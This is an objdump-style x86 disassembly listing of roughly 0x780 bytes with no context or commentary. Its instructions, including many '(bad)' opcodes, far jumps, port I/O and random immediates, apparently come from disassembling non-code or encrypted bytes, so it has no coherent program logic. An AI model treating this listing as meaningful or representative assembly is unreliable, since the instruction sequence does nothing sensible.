  42aa0b:	or     BYTE PTR [eax+ecx*4+0x7cced722],0xe5
  42aa13:	xchg   esp,eax
  42aa14:	xchg   ecx,eax
  42aa15:	(bad)  
  42aa16:	das    
  42aa17:	jbe    0xff241ae
  42aa1d:	mov    di,0xf0c5
  42aa21:	jo     0x42aa3e
  42aa23:	aam    0x27
  42aa25:	adc    esp,DWORD PTR [esp+ebx*8-0xfb4e374]
  42aa2c:	mov    ch,cl
  42aa2e:	iret   
  42aa2f:	inc    edx
  42aa30:	mov    ecx,0xc9b1b6f7
  42aa35:	jno    0x42a9f0
  42aa37:	enter  0x8a2,0x7f
  42aa3b:	aam    0x22
  42aa3d:	mov    gs,WORD PTR [eiz*8-0x30f221be]
  42aa44:	xchg   ebp,eax
  42aa45:	neg    DWORD PTR [edi-0x51a806af]
  42aa4b:	lods   eax,DWORD PTR ds:[esi]
  42aa4c:	dec    eax
  42aa4d:	loope  0x42aa59
  42aa4f:	lods   al,BYTE PTR ds:[esi]
  42aa50:	loopne 0x42aa4c
  42aa52:	pop    edi
  42aa53:	rol    BYTE PTR [esi-0x316526dd],cl
  42aa59:	xor    al,0xe
  42aa5b:	fstp   QWORD PTR [edx+esi*2]
  42aa5e:	push   ds
  42aa5f:	jmp    0x29db1176
  42aa64:	retf   0x8a00
  42aa67:	mov    eax,0xff10409c
  42aa6c:	dec    esi
  42aa6d:	jne    0x42aa20
  42aa6f:	fdiv   st(1),st
  42aa71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa72:	mov    BYTE PTR [ecx+ecx*4+0x3d71de3f],dh
  42aa79:	inc    esp
  42aa7a:	jecxz  0x42aa62
  42aa7c:	jge    0x42aa80
  42aa7e:	cmp    al,BYTE PTR [edi+esi*1]
  42aa81:	test   DWORD PTR [edx+0x2e],edi
  42aa84:	inc    edx
  42aa85:	bound  ebx,QWORD PTR [edi]
  42aa87:	jmp    0x43b886f2
  42aa8c:	pop    esi
  42aa8d:	xchg   edi,eax
  42aa8e:	rcl    ebp,cl
  42aa90:	dec    esp
  42aa91:	shr    BYTE PTR [edi+0x5be12ed8],0x72
  42aa98:	adc    BYTE PTR [edi-0x46],0xf0
  42aa9c:	cmp    ch,BYTE PTR [eax]
  42aa9e:	pop    ds
  42aa9f:	cmp    eax,0x9bd0f116
  42aaa4:	popf   
  42aaa5:	add    bh,BYTE PTR [esi]
  42aaa7:	adc    ch,bl
  42aaa9:	xchg   edx,eax
  42aaaa:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  42aaac:	popa   
  42aaad:	std    
  42aaae:	pusha  
  42aaaf:	cdq    
  42aab0:	mov    esp,0x1e4a042d
  42aab5:	jns    0x42ab16
  42aab7:	aam    0xcd
  42aab9:	xchg   ebp,eax
  42aaba:	in     eax,dx
  42aabb:	pusha  
  42aabc:	jno    0x42aad0
  42aabe:	clc    
  42aabf:	xor    al,0x7a
  42aac1:	mov    bl,0x7a
  42aac3:	pop    ebp
  42aac4:	mov    edi,ebp
  42aac6:	leave  
  42aac7:	shl    BYTE PTR [ebx],0xdc
  42aaca:	mov    dh,0x33
  42aacc:	xor    DWORD PTR [edi],0x1c
  42aacf:	push   ecx
  42aad0:	adc    eax,0x3985c42b
  42aad5:	xchg   edi,eax
  42aad6:	nop
  42aad7:	sbb    eax,0xa3fa1e55
  42aadc:	xchg   ebx,eax
  42aadd:	in     eax,dx
  42aade:	aad    0x14
  42aae0:	(bad)  
  42aae1:	pushf  
  42aae2:	gs aam 0x65
  42aae5:	pop    eax
  42aae6:	leave  
  42aae7:	jb     0x42aabe
  42aae9:	cwde   
  42aaea:	push   ds
  42aaeb:	jle    0x42aa76
  42aaed:	setno  cl
  42aaf0:	out    dx,al
  42aaf1:	pop    eax
  42aaf2:	lods   al,BYTE PTR ds:[esi]
  42aaf3:	fs dec esi
  42aaf5:	add    esp,edx
  42aaf7:	xor    al,0xcf
  42aaf9:	xchg   edx,eax
  42aafa:	aad    0x51
  42aafc:	adc    BYTE PTR [edi],dh
  42aafe:	inc    edi
  42aaff:	xchg   ebx,eax
  42ab00:	inc    edi
  42ab01:	rol    BYTE PTR [edi-0x26],1
  42ab04:	mov    BYTE PTR [ecx+0x13dd1b43],cl
  42ab0a:	mov    edx,0xa0e3706e
  42ab0f:	mov    ecx,0xf4ab5ca0
  42ab14:	dec    ecx
  42ab15:	cli    
  42ab16:	fiadd  DWORD PTR [esi+0x611e7b64]
  42ab1c:	mov    al,0x22
  42ab1e:	add    esi,ecx
  42ab20:	dec    esp
  42ab21:	mov    esp,0x335ad717
  42ab26:	xchg   edi,eax
  42ab27:	xchg   ebx,eax
  42ab28:	lea    esp,[ebx-0x6e875526]
  42ab2e:	add    BYTE PTR [edx-0x7e],al
  42ab31:	xchg   edi,eax
  42ab32:	call   0x63d7:0x3c1807b2
  42ab39:	sub    DWORD PTR [ebp*2-0x675d0a78],ecx
  42ab40:	popf   
  42ab41:	push   ebp
  42ab42:	and    ch,0xbf
  42ab45:	pop    ds
  42ab46:	xchg   BYTE PTR [eax+0x3e],dl
  42ab49:	shl    BYTE PTR [esi-0x52],0xb6
  42ab4d:	add    eax,0x79165f8b
  42ab52:	pop    esp
  42ab53:	out    0xbb,al
  42ab55:	add    eax,0x3dd453a3
  42ab5a:	xchg   ecx,eax
  42ab5b:	aad    0xfe
  42ab5d:	test   ebx,0x57058e1f
  42ab63:	and    esp,esi
  42ab65:	int    0xfc
  42ab67:	inc    edi
  42ab68:	cs inc edi
  42ab6a:	(bad)  
  42ab6b:	retf   
  42ab6c:	or     al,0x47
  42ab6e:	add    al,0x5
  42ab70:	push   ebx
  42ab71:	xor    eax,0xffffffb4
  42ab74:	pop    edx
  42ab75:	add    esi,DWORD PTR [esi-0x4d222acc]
  42ab7b:	(bad)  
  42ab7c:	sub    DWORD PTR [eax+0x7b],ebx
  42ab7f:	cmp    edx,esp
  42ab81:	scas   al,BYTE PTR es:[edi]
  42ab82:	jnp    0x42ab26
  42ab84:	test   esp,eax
  42ab86:	pusha  
  42ab87:	xchg   edx,eax
  42ab88:	enter  0x4028,0x3e
  42ab8c:	mov    DWORD PTR ds:0xd868f3b6,esp
  42ab92:	cs jae 0x42ab24
  42ab95:	add    ch,BYTE PTR [esi]
  42ab97:	lds    esp,FWORD PTR [ecx-0x1a611618]
  42ab9d:	test   BYTE PTR [eax+0x6d],ah
  42aba0:	jmp    0x7d97:0x3c0388ee
  42aba7:	pushf  
  42aba8:	adc    al,0x67
  42abaa:	lahf   
  42abab:	push   ebp
  42abac:	outs   dx,BYTE PTR ds:[esi]
  42abad:	add    al,0x37
  42abaf:	leave  
  42abb0:	sub    eax,0xd7731e21
  42abb5:	fmul   DWORD PTR [edi]
  42abb7:	leave  
  42abb8:	nop
  42abb9:	mov    edi,0x17f6cb04
  42abbe:	ror    BYTE PTR [ebx+edi*2+0x21546214],cl
  42abc5:	add    DWORD PTR [esi],edi
  42abc7:	mov    edx,0xd2aa9788
  42abcc:	add    dl,BYTE PTR [edx+0x279b3ef4]
  42abd2:	xchg   BYTE PTR [ebx+0x1c2004eb],bl
  42abd8:	push   ebx
  42abd9:	in     eax,0xda
  42abdb:	inc    esp
  42abdc:	ss jo  0x42abed
  42abdf:	or     DWORD PTR [eax-0x71f45f55],0xb6978b53
  42abe9:	sub    ebx,DWORD PTR [edi-0x7c]
  42abec:	(bad)  
  42abed:	lods   eax,DWORD PTR ds:[esi]
  42abee:	xor    esp,DWORD PTR [eax+0x4c89332e]
  42abf4:	pop    esi
  42abf5:	or     cl,dl
  42abf7:	aad    0x64
  42abf9:	fdivr  QWORD PTR [edi-0x2c8abf3f]
  42abff:	addr16 mov bh,dl
  42ac02:	call   0xdff1:0x81029478
  42ac09:	adc    al,0xfe
  42ac0b:	rcr    BYTE PTR [ecx+0x48182a50],1
  42ac11:	(bad)  
  42ac12:	mov    edx,0x7a59a921
  42ac17:	outs   dx,DWORD PTR ds:[esi]
  42ac18:	mov    esi,0x749489d7
  42ac1d:	mov    DWORD PTR [ecx-0x3],0xd4b5e384
  42ac24:	shr    DWORD PTR [ebx-0x55073a22],1
  42ac2a:	int3   
  42ac2b:	dec    eax
  42ac2c:	test   eax,0x6cf51f18
  42ac31:	inc    ecx
  42ac32:	pop    esp
  42ac33:	add    eax,DWORD PTR [ebx+0x105b1af3]
  42ac39:	es push ds
  42ac3b:	inc    edx
  42ac3d:	pop    ebp
  42ac3e:	outs   dx,BYTE PTR ds:[esi]
  42ac3f:	nop
  42ac40:	sub    bh,BYTE PTR [edi]
  42ac42:	pop    ds
  42ac43:	outs   dx,DWORD PTR ds:[esi]
  42ac44:	stos   BYTE PTR es:[edi],al
  42ac45:	cmp    DWORD PTR [ebx],edi
  42ac47:	fsub   QWORD PTR [ebx+0x7c]
  42ac4a:	fnsave [ebp+0x57]
  42ac4d:	mov    fs,WORD PTR [eax+0x12]
  42ac50:	pop    ebp
  42ac51:	and    bl,BYTE PTR [edi]
  42ac53:	in     eax,dx
  42ac54:	sub    eax,0x582abce7
  42ac59:	cwde   
  42ac5a:	clc    
  42ac5b:	aad    0xf9
  42ac5d:	or     eax,DWORD PTR [esi-0x39b2314a]
  42ac63:	lds    ecx,FWORD PTR [edx-0x1f493ed9]
  42ac69:	cmp    DWORD PTR [edx-0x48dcbf9d],ebx
  42ac6f:	aad    0x7c
  42ac71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac72:	fdivr  QWORD PTR [edx-0x4fbf8d2a]
  42ac78:	mov    DWORD PTR [ecx+0xa33a9bb],eax
  42ac7e:	push   ss
  42ac7f:	jecxz  0x42ac99
  42ac81:	add    ah,BYTE PTR [esi-0x72]
  42ac84:	adc    cl,al
  42ac86:	adc    al,0xec
  42ac88:	mov    dl,0x87
  42ac8a:	pusha  
  42ac8b:	outs   dx,DWORD PTR ds:[esi]
  42ac8c:	in     eax,dx
  42ac8d:	ins    BYTE PTR es:[edi],dx
  42ac8e:	adc    al,0xe2
  42ac90:	add    al,0x4f
  42ac92:	jg     0x42ac69
  42ac94:	pop    ds
  42ac95:	jle    0x42acff
  42ac97:	dec    ebx
  42ac98:	bound  esi,QWORD PTR [edx+0x7389bb5a]
  42ac9e:	xchg   ebp,eax
  42ac9f:	int    0x94
  42aca1:	xchg   ecx,eax
  42aca2:	and    edx,esi
  42aca4:	rol    DWORD PTR ds:0xb3096b66,1
  42acaa:	cmp    edi,DWORD PTR [eax-0x2b]
  42acad:	cs push esi
  42acaf:	mov    ch,0xbb
  42acb1:	jmp    0x9eab:0x1089f0d9
  42acb8:	ss fwait
  42acba:	mov    ch,0xd5
  42acbc:	mov    ds:0x7666eb73,al
  42acc1:	leave  
  42acc2:	mov    WORD PTR [ebp-0xceb7279],fs
  42acc8:	cmp    eax,DWORD PTR [eax+eiz*1-0x6f40b508]
  42accf:	aam    0xa7
  42acd1:	ss jle 0x42acff
  42acd4:	in     al,0x41
  42acd6:	push   ebp
  42acd7:	pop    eax
  42acd8:	mov    BYTE PTR ds:0x2733a7db,cl
  42acde:	inc    ebx
  42acdf:	add    ch,dh
  42ace1:	add    bh,BYTE PTR [eax]
  42ace3:	neg    BYTE PTR [edi+0x5c482465]
  42ace9:	mov    gs,WORD PTR [ebp-0x1b]
  42acec:	je     0x42ad55
  42acee:	lods   eax,DWORD PTR ds:[esi]
  42acef:	sub    BYTE PTR [ebx+0x46],ch
  42acf2:	jg     0x42acb7
  42acf4:	pusha  
  42acf5:	rol    DWORD PTR ds:0x81bf8dd7,0x82
  42acfc:	mov    bl,0x70
  42acfe:	cwde   
  42acff:	das    
  42ad00:	mov    BYTE PTR [edi-0x1f],ah
  42ad03:	add    eax,0x8f231714
  42ad08:	rol    DWORD PTR [edx],1
  42ad0a:	sbb    bh,bh
  42ad0c:	imul   eax,eax,0xffffff9e
  42ad0f:	fnstsw WORD PTR gs:[esi+0x55332db7]
  42ad16:	stos   BYTE PTR es:[edi],al
  42ad17:	or     DWORD PTR [ecx+0x5abc5ef3],0x3ea00bdd
  42ad21:	inc    eax
  42ad22:	(bad)
  42ad25:	xor    al,0x1e
  42ad27:	(bad)  
  42ad28:	push   esi
  42ad29:	add    DWORD PTR [ecx],0x30
  42ad2c:	cmp    al,0x85
  42ad2e:	pop    ds
  42ad2f:	shl    BYTE PTR [esi+eax*8-0x10],1
  42ad33:	aad    0xa7
  42ad35:	mov    bh,0xa9
  42ad37:	jmp    0x42acd9
  42ad39:	add    BYTE PTR [edx],al
  42ad3b:	enter  0x9188,0xff
  42ad3f:	sub    DWORD PTR [eax-0x2f6c8354],ebx
  42ad45:	dec    ebx
  42ad46:	fs ins BYTE PTR es:[edi],dx
  42ad48:	mov    bh,0x82
  42ad4a:	popa   
  42ad4b:	pushf  
  42ad4c:	nop
  42ad4d:	push   ebp
  42ad4e:	inc    eax
  42ad4f:	add    eax,0x6acee78b
  42ad54:	aaa    
  42ad55:	dec    edx
  42ad56:	xchg   BYTE PTR [edi+0x18],cl
  42ad59:	repz xor edx,esp
  42ad5c:	add    al,0x13
  42ad5e:	es cmp eax,0x49f68490
  42ad64:	mov    BYTE PTR [ebx+0x5280c8e],ah
  42ad6a:	mov    ds:0x7849bd0e,al
  42ad6f:	push   cs
  42ad70:	mov    al,ds:0x3154021f
  42ad75:	inc    DWORD PTR [edx]
  42ad77:	fnstcw WORD PTR [ecx]
  42ad79:	sub    BYTE PTR [ebp-0x4c],0x9d
  42ad7d:	push   ebx
  42ad7e:	(bad)  
  42ad7f:	sbb    eax,0x29d0008c
  42ad84:	outs   dx,BYTE PTR ds:[esi]
  42ad85:	jns    0x42ad5c
  42ad87:	dec    eax
  42ad88:	pop    edx
  42ad89:	mov    ebp,0xda61d55f
  42ad8e:	or     al,BYTE PTR [edx-0x10]
  42ad91:	mov    ebx,0x5b89eeef
  42ad96:	jb     0x42ad79
  42ad98:	out    dx,eax
  42ad99:	add    al,0x49
  42ad9b:	mov    edi,0xa9660389
  42ada0:	sub    bl,BYTE PTR ds:0x95e7fa4a
  42ada6:	stos   DWORD PTR es:[edi],eax
  42ada7:	xor    al,0x8f
  42ada9:	xor    DWORD PTR [edi-0x303a4c90],ebp
  42adaf:	and    al,BYTE PTR [edx]
  42adb1:	jl     0x42add2
  42adb3:	iret   
  42adb4:	xchg   edx,eax
  42adb5:	xlat   BYTE PTR ds:[ebx]
  42adb6:	js     0x42ad44
  42adb8:	add    BYTE PTR [ebp-0x419f53c2],0x40
  42adbf:	sub    bh,BYTE PTR [edx+0x3]
  42adc2:	cmc    
  42adc3:	xchg   edi,eax
  42adc4:	mov    edx,0xb34360d0
  42adc9:	push   ds
  42adca:	and    cl,BYTE PTR [ecx]
  42adcc:	inc    esp
  42adcd:	xlat   BYTE PTR ds:[ebx]
  42adce:	out    0xd4,eax
  42add0:	cmp    eax,DWORD PTR [ecx]
  42add2:	jae    0x42ad90
  42add4:	or     dl,BYTE PTR [ebx-0x5d0d3553]
  42adda:	or     DWORD PTR [esp+edi*8-0x2bf2b6f7],ecx
  42ade1:	das    
  42ade2:	or     esp,edx
  42ade4:	mov    ss,WORD PTR [ecx-0x7f]
  42ade7:	addr16 aam 0xbb
  42adea:	jno    0x42adcf
  42adec:	jnp    0x42ad87
  42adee:	pop    ecx
  42adef:	mov    edx,0x44059458
  42adf4:	push   0x98d2ad7
  42adf9:	add    dh,BYTE PTR [esp+edx*4-0x4e838f14]
  42ae00:	jle    0x42ada8
  42ae02:	pusha  
  42ae03:	push   ebx
  42ae04:	sbb    eax,0x8d610531
  42ae09:	lea    esi,[esi+0x6d63285d]
  42ae0f:	(bad)  
  42ae10:	(bad)  
  42ae11:	xchg   edi,eax
  42ae12:	sub    esi,edi
  42ae14:	push   edi
  42ae15:	or     eax,0x39b8e4ab
  42ae1a:	mov    esp,ecx
  42ae1c:	lods   al,BYTE PTR ds:[esi]
  42ae1d:	ret    0xd5ca
  42ae20:	repnz push ss
  42ae22:	mov    al,0x3d
  42ae24:	aaa    
  42ae25:	add    eax,0x9b94e64d
  42ae2a:	sub    DWORD PTR [ebx-0x42e27a65],0xffffff82
  42ae31:	test   BYTE PTR [edi-0x61e8954f],cl
  42ae37:	aad    0x9e
  42ae39:	faddp  st(7),st
  42ae3b:	pop    eax
  42ae3c:	dec    esi
  42ae3d:	pushf  
  42ae3e:	pop    ds
  42ae3f:	imul   esp,DWORD PTR [esp+esi*4-0x55f7f1a],0xffffffc9
  42ae47:	aam    0x93
  42ae49:	imul   edi,DWORD PTR [ebx],0x2a
  42ae4c:	imul   ebp,esp,0xa9894164
  42ae52:	mov    ebx,0x90197bc6
  42ae57:	cld    
  42ae58:	call   0x7f559262
  42ae5d:	adc    bh,BYTE PTR [ebx-0x49]
  42ae60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ae61:	jmp    FWORD PTR [edx-0x29]
  42ae64:	pusha  
  42ae65:	ret    
  42ae66:	fsubr  QWORD PTR [edx]
  42ae68:	mov    ebp,DWORD PTR [eax+0x7fe92bfc]
  42ae6e:	call   0x79c710df
  42ae73:	aam    0xe2
  42ae75:	or     BYTE PTR [eax-0x64],dh
  42ae78:	dec    esi
  42ae79:	lock jl 0x42aed3
  42ae7c:	pop    ds
  42ae7d:	shl    DWORD PTR [edi],0xba
  42ae80:	outs   dx,DWORD PTR ds:[esi]
  42ae81:	sbb    bh,0xc0
  42ae84:	jle    0x42aebd
  42ae86:	mov    eax,ds:0xb2023bec
  42ae8b:	shl    BYTE PTR [eax+0x545e5584],1
  42ae91:	pop    edi
  42ae92:	push   ds
  42ae93:	mov    ebx,DWORD PTR [ebx+0x57]
  42ae96:	adc    eax,DWORD PTR ds:0xd401a774
  42ae9c:	xchg   edx,eax
  42ae9d:	dec    ecx
  42ae9e:	inc    edi
  42ae9f:	sbb    DWORD PTR [ebp-0x3c],ebx
  42aea2:	nop
  42aea3:	stos   DWORD PTR es:[edi],eax
  42aea4:	jp     0x42af08
  42aea6:	pop    ds
  42aea7:	dec    edi
  42aea8:	outs   dx,DWORD PTR ds:[esi]
  42aea9:	mov    al,ds:0xfa4c0be8
  42aeae:	push   0xffffffd4
  42aeb0:	scas   al,BYTE PTR es:[edi]
  42aeb1:	sbb    DWORD PTR [ebx-0x22],ecx
  42aeb4:	jle    0x42aed8
  42aeb6:	push   ss
  42aeb7:	inc    ebx
  42aeb8:	inc    esp
  42aeb9:	out    0xd,eax
  42aebb:	sbb    ah,BYTE PTR [ebp-0x77395d07]
  42aec1:	inc    ebx
  42aec2:	cmp    esi,DWORD PTR ds:0x54604446
  42aec8:	mov    esp,0xcb3494d8
  42aecd:	cmp    eax,0xb1d98960
  42aed2:	jno    0x42aed2
  42aed4:	xchg   esp,eax
  42aed5:	xor    al,0x15
  42aed7:	inc    edi
  42aed8:	shr    esi,0x84
  42aedb:	pop    esp
  42aedc:	ror    DWORD PTR [esi+0x486c6760],1
  42aee2:	adc    BYTE PTR [edi+0x67],al
  42aee5:	mov    bl,BYTE PTR [edi]
  42aee7:	pop    ds
  42aee8:	int    0x36
  42aeea:	in     eax,dx
  42aeeb:	out    0xaa,eax
  42aeed:	cdq    
  42aeee:	dec    edx
  42aeef:	call   0x3fc0:0x546d6cee
  42aef6:	pop    eax
  42aef7:	xlat   BYTE PTR ds:[ebx]
  42aef8:	push   ds
  42aef9:	jle    0x42aea2
  42aefb:	jnp    0x42af5b
  42aefd:	retf   
  42aefe:	pop    ds
  42aeff:	xchg   ebp,eax
  42af00:	ss inc esp
  42af02:	jns    0x42af46
  42af04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af05:	add    dh,BYTE PTR [eax-0x5c]
  42af08:	cmp    bh,BYTE PTR [eax+edi*1-0x73]
  42af0c:	sub    ah,BYTE PTR [ebp+0x10baab7b]
  42af12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42af13:	push   ebp
  42af14:	lahf   
  42af15:	cmp    DWORD PTR [ebx-0x37],ebx
  42af18:	std    
  42af19:	add    eax,0xad61e3f0
  42af1e:	stos   BYTE PTR es:[edi],al
  42af1f:	out    dx,eax
  42af20:	jnp    0x42af98
  42af22:	and    dl,ch
  42af24:	jbe    0x42af00
  42af26:	pop    ds
  42af27:	dec    ecx
  42af28:	jo     0x42aee1
  42af2a:	jns    0x42af40
  42af2c:	adc    al,0x34
  42af2e:	pop    es
  42af2f:	aam    0x8b
  42af31:	mov    ah,0x50
  42af33:	inc    ebx
  42af34:	or     ebx,DWORD PTR [ecx+0x32]
  42af37:	retf   0xabf2
  42af3a:	out    0xd4,al
  42af3c:	sub    al,0xf4
  42af3e:	int3   
  42af3f:	mov    bl,0x40
  42af41:	adc    ch,bh
  42af43:	(bad)  
  42af44:	push   ebx
  42af45:	out    dx,eax
  42af46:	pop    esp
  42af47:	mov    ds:0xc4db6596,al
  42af4c:	mov    ecx,0xbe171f5f
  42af51:	inc    ecx
  42af52:	repz sbb ah,BYTE PTR [edx+0xfd6802d]
  42af59:	xlat   BYTE PTR ds:[ebx]
  42af5a:	stos   DWORD PTR es:[edi],eax
  42af5b:	add    BYTE PTR [esi+0x16070f3b],dl
  42af61:	sbb    ah,BYTE PTR [ecx-0x19]
  42af64:	ds xor bl,cl
  42af67:	inc    esp
  42af68:	in     eax,0xf8
  42af6a:	enter  0x7026,0xf9
  42af6e:	rcl    ebp,1
  42af70:	inc    edx
  42af71:	(bad)  [edi]
  42af73:	add    esi,ecx
  42af75:	sbb    al,0x72
  42af77:	cmc    
  42af78:	mov    BYTE PTR [edi],bl
  42af7a:	or     eax,0x72f00d9c
  42af7f:	lods   al,BYTE PTR ds:[esi]
  42af80:	inc    ecx
  42af81:	add    edi,DWORD PTR [edx-0xf2dbac8]
  42af87:	fistp  DWORD PTR [ebx-0x1c]
  42af8a:	pushf  
  42af8b:	mov    esp,0xa924fb85
  42af90:	jge    0x42af95
  42af92:	sub    BYTE PTR [edx],0xda
  42af95:	mov    ah,0x1a
  42af97:	imul   ebx,esi,0x432b1f35
  42af9d:	xchg   edi,eax
  42af9e:	jmp    0x42af78
  42afa0:	sbb    BYTE PTR [ebx],ch
  42afa2:	pop    edx
  42afa3:	shr    DWORD PTR [ebp+0x15],cl
  42afa6:	sbb    al,0xd4
  42afa8:	les    edx,FWORD PTR [ecx-0x52]
  42afab:	dec    esp
  42afac:	push   esi
  42afad:	and    al,0x60
  42afaf:	(bad)  [ebx+0x63]
  42afb2:	mov    dl,0x14
  42afb4:	cmp    DWORD PTR [edi+ecx*8],0x21f34430
  42afbb:	xlat   BYTE PTR ds:[ebx]
  42afbc:	call   0x5541:0xbe56ddf
  42afc3:	(bad)  
  42afc4:	adc    DWORD PTR [esi],edx
  42afc6:	sub    eax,0x40fd3159
  42afcb:	mov    BYTE PTR [edi-0x590dc303],bl
  42afd1:	add    dl,BYTE PTR [ebp+0x1250ec58]
  42afd7:	aam    0x57
  42afd9:	or     eax,0x761b76e8
  42afde:	xchg   esp,eax
  42afdf:	dec    edx
  42afe0:	repz sbb bl,BYTE PTR [edi+0x62]
  42afe4:	mov    BYTE PTR [eax+0x597d7a7],dh
  42afea:	cli    
  42afeb:	push   esi
  42afec:	and    ch,BYTE PTR [ebx+0x21e728f9]
  42aff2:	fs sbb eax,esi
  42aff5:	push   0xffffffcf
  42aff7:	aaa    
  42aff8:	jae    0x42b047
  42affa:	cmp    DWORD PTR [ebx+esi*4-0x643378b6],esp
  42b001:	add    eax,0x966212cc
  42b006:	mov    eax,ds:0xa8b81675
  42b00b:	sub    edx,0x43
  42b00e:	gs ins DWORD PTR es:[edi],dx
  42b010:	xchg   esp,eax
  42b011:	bound  eax,QWORD PTR [esi-0x16a043bb]
  42b017:	fwait
  42b018:	adc    esp,DWORD PTR [ecx-0x1]
  42b01b:	push   ecx
  42b01c:	sbb    edi,0xa5096430
  42b022:	fucomip st,st(7)
  42b024:	les    eax,FWORD PTR [ebx+0x158815c1]
  42b02a:	in     al,0xfe
  42b02c:	adc    BYTE PTR [ecx+0x4bb4d423],cl
  42b032:	adc    al,0xc1
  42b034:	pop    esp
  42b035:	not    BYTE PTR [esi+0xb]
  42b038:	call   0x176810f7
  42b03d:	inc    ecx
  42b03e:	ret    
  42b03f:	das    
  42b040:	push   edx
  42b041:	push   0xc6d1aaeb
  42b046:	pop    ss
  42b047:	bound  edi,QWORD PTR [ecx+ebx*4]
  42b04a:	into   
  42b04b:	push   ebp
  42b04c:	shl    ecx,1
  42b04e:	je     0x42afe4
  42b050:	mov    eax,0x4fb1fe0
  42b055:	adc    eax,0x42cec08c
  42b05a:	bound  esp,QWORD PTR [edx-0xadd9acf]
  42b060:	mov    BYTE PTR [edx+0x20995a53],bh
  42b066:	pop    ds
  42b067:	cmp    eax,DWORD PTR [ebx+0x6e]
  42b06a:	add    DWORD PTR [ebp-0x2bf9a8c2],ebx
  42b070:	adc    bh,BYTE PTR [ebp-0x43]
  42b073:	cdq    
  42b074:	leave  
  42b075:	fwait
  42b076:	mov    dl,0x8a
  42b078:	(bad)  
  42b079:	out    0xd9,eax
  42b07b:	sub    BYTE PTR [esi],dl
  42b07d:	popa   
  42b07e:	jl     0x42b0c4
  42b080:	or     al,0x6b
  42b082:	add    esp,edx
  42b084:	xchg   BYTE PTR [ebp+ebx*1-0x28],dl
  42b088:	stos   DWORD PTR es:[edi],eax
  42b089:	fsub   st,st(3)
  42b08b:	or     edi,DWORD PTR [eax+0x7b]
  42b08e:	jnp    0x42b0a9
  42b090:	ror    bl,0xf4
  42b093:	xchg   ebp,eax
  42b094:	jecxz  0x42b10f
  42b096:	mov    ds:0x440325fe,eax
  42b09b:	adc    al,0xa8
  42b09d:	mov    ch,0xe0
  42b09f:	dec    ebx
  42b0a0:	mov    bh,0x51
  42b0a2:	push   ds
  42b0a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b0a4:	arpl   bx,di
  42b0a6:	push   ecx
  42b0a7:	push   ds
  42b0a8:	dec    esi
  42b0a9:	push   esp
  42b0aa:	imul   ebx,DWORD PTR [edx+0x55d3ca22],0xffffffe3
  42b0b1:	inc    ebx
  42b0b2:	adc    BYTE PTR [edi-0x489f6816],al
  42b0b8:	cmp    ch,BYTE PTR gs:[eax+0x24]
  42b0bc:	mov    WORD PTR [ecx+0x79e7d55c],cs
  42b0c2:	test   eax,0xbc5cb11
  42b0c7:	ror    DWORD PTR [eax+0x1dbee4b1],0xe3
  42b0ce:	push   0xa565a824
  42b0d3:	aam    0x3e
  42b0d5:	arpl   cx,si
  42b0d7:	jmp    FWORD PTR [edi-0x3d]
  42b0da:	push   0x1c
  42b0dc:	mov    DWORD PTR [ecx+0x3f],edi
  42b0df:	cmp    al,0x6d
  42b0e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b0e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b0e3:	mov    BYTE PTR [ecx+0x46],dl
  42b0e6:	sub    al,0x59
  42b0e8:	mov    WORD PTR ds:0xf4ca2234,es
  42b0ee:	adc    ch,ah
  42b0f0:	mov    ?,WORD PTR [edi-0x3fc73c23]
  42b0f6:	inc    esp
  42b0f7:	xor    al,0x66
  42b0f9:	xchg   esi,eax
  42b0fa:	xchg   ecx,eax
  42b0fb:	stos   DWORD PTR es:[edi],eax
  42b0fc:	retf   
  42b0fd:	cmp    edx,DWORD PTR [eax-0x65]
  42b100:	ins    BYTE PTR es:[edi],dx
  42b101:	and    al,BYTE PTR [ecx]
  42b103:	sbb    al,0xa9
  42b105:	mov    al,0x60
  42b107:	out    dx,eax
  42b108:	rcl    DWORD PTR [edx-0x3f9cab3d],cl
  42b10e:	aad    0x25
  42b110:	and    ch,BYTE PTR [edx+0x7d]
  42b113:	in     eax,0xbb
  42b115:	fldenv [edx-0x2c]
  42b118:	cld    
  42b119:	pop    eax
  42b11a:	push   ebp
  42b11b:	or     eax,0x9d60a68c
  42b120:	nop
  42b121:	je     0x42b139
  42b123:	inc    ebp
  42b124:	(bad)  
  42b125:	ins    DWORD PTR es:[edi],dx
  42b126:	cmp    bh,dl
  42b128:	mov    ebx,0xee696a66
  42b12d:	sbb    ecx,DWORD PTR [edx+0x56bf89c8]
  42b133:	add    BYTE PTR [eax-0x3d],dh
  42b136:	test   dh,cl
  42b138:	mov    dh,0x29
  42b13a:	xchg   esi,eax
  42b13b:	fstp   DWORD PTR [esi+0x67]
  42b13e:	fsubr  QWORD PTR [ebx]
  42b140:	xchg   ebp,eax
  42b141:	dec    ecx
  42b142:	int    0xf4
  42b144:	adc    al,0x3e
  42b146:	or     ch,BYTE PTR ds:0x2100388
  42b14c:	and    DWORD PTR [eax+0x4a417cd9],ebx
  42b152:	in     al,0xcd
  42b154:	cmp    BYTE PTR [ebx],al
  42b156:	pop    ebx
  42b157:	or     ebx,DWORD PTR [ebx-0x76604c79]
  42b15d:	dec    ebp
  42b15e:	inc    esi
  42b15f:	pop    es
  42b160:	lea    esp,[ecx]
  42b162:	jp     0x42b15e
  42b164:	out    dx,eax
  42b165:	add    al,bh
  42b167:	cdq    
  42b168:	pop    eax
  42b169:	xlat   BYTE PTR ds:[ebx]
  42b16a:	imul   edx,DWORD PTR [ebx+0x4a],0xb
  42b16e:	js     0x42b1eb
  42b170:	mov    DWORD PTR [ebx-0x4],ecx
  42b173:	jle    0x42b1a1
  42b175:	xor    eax,0x39
  42b178:	jo     0x42b17c
  42b17a:	es dec ebp
  42b17c:	lods   al,BYTE PTR ds:[esi]
  42b17d:	hlt    
  42b17e:	sbb    edi,DWORD PTR [ecx-0x29eeeac]
  42b184:	(bad)  
  42b185:	inc    ecx
  42b186:	and    al,0x95
  42b188:	fidiv  WORD PTR [ecx]
  42b18a:	aas    
  42b18b:	out    dx,eax
